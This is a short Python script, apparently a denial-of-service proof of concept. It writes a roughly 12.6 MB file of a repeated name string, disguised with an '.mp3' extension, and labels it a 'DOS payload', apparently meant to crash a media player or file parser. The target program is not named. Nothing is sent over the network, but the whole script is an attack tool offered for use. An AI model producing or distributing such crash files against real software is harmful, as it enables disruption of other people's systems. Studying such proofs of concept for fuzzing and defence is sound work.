buffer = "\x56\x69\x73\x76\x68\x65\x73\x68\x20\x6A\x61\x69\x6E\x0A" * 900000
try:
    f=open("output3.vishvesh","w")
    f1=open("output3.mp3","w")
    print("[!] Creating %s bytes DOS payload...." %len(buffer))
    f.write(buffer)
    f1.write(buffer)
    f.close()
    f1.close()
    print("[!] File Created !")
except:
    print("File cannot be created")
